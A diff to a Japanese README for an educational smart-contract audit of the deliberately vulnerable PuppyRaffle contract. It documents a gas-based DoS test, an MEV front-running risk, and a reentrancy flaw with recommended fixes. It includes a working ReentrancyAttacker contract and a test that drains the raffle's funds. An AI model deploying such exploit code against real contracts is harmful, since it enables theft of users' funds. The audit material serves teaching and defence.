@@ -175,6 +175,40 @@ function enterRaffle(address[] memory newPlayers) public payable {
 
 **教育的価値**: アルゴリズム計算量の重要性とガス効率の実践的理解
 
+#### DoS攻撃の実証テスト（testDenialOfService）
+
+**テストの目的**: O(n²)計算量問題によるガス使用量の指数的増加を実証
+
+**テスト設計**:
+```solidity
+function testDenialOfService() public {
+    // 1回目: 0→100人の参加
+    address[] memory players = new address[](100);
+    uint256 gasUsedFirst = measureGasUsage(players);
+    
+    // 2回目: 100→200人の参加（既存100人と重複チェック）
+    address[] memory playersTwo = new address[](100);
+    uint256 gasUsedSecond = measureGasUsage(playersTwo);
+    
+    assert(gasUsedFirst < gasUsedSecond); // ガス使用量の増加を証明
+}
+```
+
+**実測結果**:
+- **1回目（0→100人）**: 6,544,754 ガス
+- **2回目（100→200人）**: 18,938,144 ガス
+- **増加率**: 約289%（約3倍の増加）
+
+**攻撃シナリオ**:
+1. 攻撃者が大量のアドレスで先行参加
+2. 後続ユーザーは指数的に増加するガス費用に直面
+3. ガス制限によりサービス実質停止
+
+**経済的影響** (ガス価格20 Gwei、ETH=$2,000想定):
+- 1回目のコスト: $0.26
+- 2回目のコスト: $0.76
+- **3倍のコスト増加**によるユーザビリティ悪化
+
 ## 開発者ガイド
 
 ### 環境要件
@@ -188,6 +222,9 @@ make install
 # ビルドとテスト
 make build
 forge test
+
+# DoS攻撃テストの実行
+forge test --match-test testDenialOfService -vv
 ```
 
 ### セキュリティ解析実行
@@ -233,6 +270,194 @@ diff slither.md aderyn.md
 - ✅ 完全動作するSolidity ^0.8.25コントラクト
 - ✅ 全テスト成功 (20/20テスト)
 - ✅ 詳細なSlitherセキュリティレポート
+- ✅ AderynによるDoS脆弱性の精密検出
+- ✅ DoS攻撃実証テスト（3倍ガス増加を実測）
 - ✅ 教育目的の脆弱性保持（意図的）
+
+#### MEV脆弱性の発見と解析（2025-08-15）
+
+**PuppyRaffle::refund()関数のMEV攻撃脆弱性**
+
+**脆弱性のあるコード**:
+```solidity
+// src/PuppyRaffle.sol:118-125
+function refund(uint256 playerIndex) public {
+    // @audit MEV vulnerability - playerIndex観測可能
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+    payable(msg.sender).sendValue(entranceFee);
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+**MEV攻撃の仕組み**:
+1. **メンプール監視**: MEVボットが`refund(playerIndex)`トランザクションを監視
+2. **パラメータ抽出**: `playerIndex`値をトランザクションデータから取得
+3. **フロントランニング**: より高いガス価格で同じ`playerIndex`を使用して攻撃
+4. **経済的損失**: 正当なユーザーのトランザクション失敗とガス浪費
+
+**教育的価値**:
+- **実世界のMEV問題**: DeFiプロトコルで頻繁に発生する実際の攻撃手法
+- **メンプール分析**: ブロックチェーンの透明性がもたらすセキュリティリスク
+- **ガス価格競争**: トランザクション順序操作による経済的攻撃
+- **設計思想の重要性**: パラメータの可視性がセキュリティに与える影響
+
+**推奨修正**:
+```solidity
+// MEV耐性のあるrefund実装
+function refund() public {
+    uint256 playerIndex = _getPlayerIndex(msg.sender);
+    require(playerIndex != type(uint256).max, "PuppyRaffle: Player not found");
+    // 以下同様の処理
+}
+
+function _getPlayerIndex(address player) internal view returns (uint256) {
+    for (uint256 i = 0; i < players.length; i++) {
+        if (players[i] == player) return i;
+    }
+    return type(uint256).max;
+}
+```
+
+**重要な学習ポイント**:
+- **観測可能性の最小化**: 外部パラメータの削除
+- **内部計算による解決**: msg.senderベースの実装
+- **MEV耐性設計**: フロントランニング攻撃の根本的防止
+
+#### リエントランシー攻撃脆弱性の実証（2025-08-18）
+
+**PuppyRaffle::refund()関数のリエントランシー脆弱性**
+
+**脆弱性のあるコード**:
+```solidity
+// src/PuppyRaffle.sol:118-125
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+    // @audit reentrancy - 状態更新前の外部呼び出し
+    payable(msg.sender).sendValue(entranceFee);
+    players[playerIndex] = address(0); // ← 状態更新が後
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+**攻撃の仕組み**:
+1. **初期参加**: 攻撃コントラクトがラッフルに参加
+2. **refund呼び出し**: `refund()`を呼び出して返金開始
+3. **リエントランシー**: `sendValue()`でETH受信時に`receive()`がトリガー
+4. **状態確認**: `players[playerIndex]`がまだ無効化されていない
+5. **再帰攻撃**: 同じindexで再度`refund()`を呼び出し
+6. **資金枯渇**: コントラクトの全資金を盗取
+
+**実装された攻撃コントラクト**:
+```solidity
+contract ReentrancyAttacker {
+    PuppyRaffle public puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    function attack() public payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex); // 最初の攻撃開始
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex); // リエントランシー攻撃
+        }
+    }
+
+    receive() external payable {
+        _stealMoney(); // ETH受信時に再帰攻撃
+    }
+}
+```
+
+**攻撃テストの実装**:
+```solidity
+function testReentrancy() public {
+    // 4名のプレイヤーでラッフル準備
+    address[] memory players = new address[](4);
+    players[0] = playerOne;
+    players[1] = playerTwo;
+    players[2] = playerThree;
+    players[3] = playerFour;
+    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+    // 攻撃コントラクト展開
+    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+    
+    uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;
+    
+    // リエントランシー攻撃実行
+    attackerContract.attack{value: entranceFee}();
+    
+    // 結果: PuppyRaffleの資金が枯渇
+    console.log("ending puppy raffle balance:", address(puppyRaffle).balance);
+}
+```
+
+**攻撃の詳細分析**:
+- **CEI (Checks-Effects-Interactions) パターン違反**: 外部呼び出し後の状態更新
+- **状態の不整合**: `players[playerIndex]`が複数回の呼び出しで有効のまま
+- **資金枯渇攻撃**: 他のプレイヤーの参加費も盗取可能
+- **ガス制限回避**: `sendValue()`は2300ガス制限があるが攻撃には十分
+
+**教育的価値**:
+- **経典的な攻撃手法**: DeFiプロトコルで最も頻繁に発生する脆弱性
+- **CEIパターンの重要性**: セキュアなスマートコントラクト設計の基本原則
+- **状態管理の重要性**: 外部呼び出し前の状態更新の必要性
+- **実際の攻撃実証**: テストネットでの攻撃シナリオの再現
+
+**推奨修正方法**:
+```solidity
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+    
+    // Effects: 状態を先に更新
+    players[playerIndex] = address(0);
+    emit RaffleRefunded(playerAddress);
+    
+    // Interactions: 外部呼び出しを最後に
+    payable(msg.sender).sendValue(entranceFee);
+}
+```
+
+または **ReentrancyGuard** の使用:
+```solidity
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
+    function refund(uint256 playerIndex) public nonReentrant {
+        // 既存のロジック
+    }
+}
+```
+
+#### 総合セキュリティ解析結果
+
+**発見された脆弱性**:
+1. **[H-1] DoS攻撃**: O(n²)アルゴリズムによるガス枯渇攻撃
+2. **[M-1] ロジックエラー**: `getActivePlayerIndex`の0戻り値曖昧性
+3. **[H-2] MEV脆弱性**: `refund`関数のフロントランニング攻撃
+4. **[H-3] リエントランシー攻撃**: `refund`関数のCEIパターン違反による資金枯渇
+
+**静的解析ツールの限界**:
+- **Slither**: 基本的なリエントランシーと型安全性検出に特化
+- **Aderyn**: DoS攻撃パターンの検出は可能だが具体的影響分析不足
+- **手動監査の必要性**: ビジネスロジックとMEV攻撃は人的分析が必要
+
+**教育的成果**:
+- **包括的監査手法**: 自動化ツールと手動解析の組み合わせ
+- **実践的攻撃シナリオ**: 実際のDeFi環境で発生する攻撃の理解
+- **修正戦略の学習**: 各脆弱性タイプに応じた適切な対策手法
 
 この現代化作業により、学習者は最新の開発環境で実際のセキュリティ問題に取り組むことができ、より実践的なスマートコントラクト開発スキルを習得できるようになりました。
